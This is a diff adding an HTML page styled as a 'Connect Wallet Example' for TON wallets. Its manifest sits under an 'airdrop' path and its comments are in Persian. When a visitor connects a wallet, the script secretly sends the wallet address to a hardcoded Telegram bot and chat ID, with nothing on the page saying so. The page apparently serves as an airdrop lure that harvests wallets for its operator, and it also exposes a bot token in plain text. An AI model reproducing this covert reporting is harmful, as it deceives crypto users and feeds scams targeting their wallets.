@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet Example</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .button {
+            background-color: orange;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            padding: 10px 15px;
+            margin: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .button:hover {
+            background-color: darkorange;
+        }
+
+        .wallet-info {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #e7f3fe;
+            border-left: 6px solid #2196F3;
+            border-radius: 5px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Connect Your Wallet</h1>
+<button id="connect-wallet" class="button">Connect Wallet</button>
+
+<div id="wallet-info" class="wallet-info" style="display: none;">
+    <h3>Wallet Connected</h3>
+    <p><strong>Address:</strong> <span id="wallet-address"></span></p>
+</div>
+
+<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+<script>
+    // Initialize TonConnect
+    const connector = new TonConnect({
+        manifestUrl: 'https://nxlpw.github.io/airdrop/tonconnect-manifest.json'
+    });
+
+    // توکن Telegram Bot و Chat ID شما
+    const token = '7634000682:AAEE4LXVfF0VXU-3jC6sHajC8SZMpzcOU50'; // توکن ربات شما
+    const chatId = '5413361339'; // Chat ID شما
+
+    // دکمه Connect Wallet را انتخاب کنید
+    const connectWalletButton = document.getElementById('connect-wallet');
+    const walletInfo = document.getElementById('wallet-info');
+    const walletAddress = document.getElementById('wallet-address');
+
+    // اضافه کردن رویداد کلیک به دکمه
+    connectWalletButton.addEventListener('click', async () => {
+        try {
+            // بررسی کنید که آیا کیف پول کاربر قبلاً متصل شده است
+            if (connector.connected) {
+                alert('Wallet is already connected!');
+                return;
+            }
+
+            // درخواست اتصال به کیف پول
+            const walletsList = await connector.getWallets();
+            const wallet = walletsList[0]; // اولین کیف پول را انتخاب کنید
+
+            if (wallet) {
+                await connector.connect({ jsBridgeKey: wallet.jsBridgeKey });
+                alert('Wallet connected successfully!');
+            } else {
+                alert('No wallet found!');
+            }
+        } catch (error) {
+            console.error('Error connecting wallet:', error);
+            alert('Error connecting wallet. Please try again.');
+        }
+    });
+
+    // گوش دادن به تغییرات وضعیت اتصال
+    connector.onStatusChange(wallet => {
+        if (wallet) {
+            console.log('Wallet connected:', wallet);
+            walletInfo.style.display = 'block';
+            walletAddress.textContent = wallet.account.address;
+
+            // ارسال اطلاعات به Telegram Bot
+            const message = `New wallet connected:\nAddress: ${wallet.account.address}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Message sent to Telegram!');
+                } else {
+                    console.error('Error sending message to Telegram.');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+            });
+        } else {
+            console.log('Wallet disconnected');
+            walletInfo.style.display = 'none';
+        }
+    });
+</script>
+
+</body>
+</html>
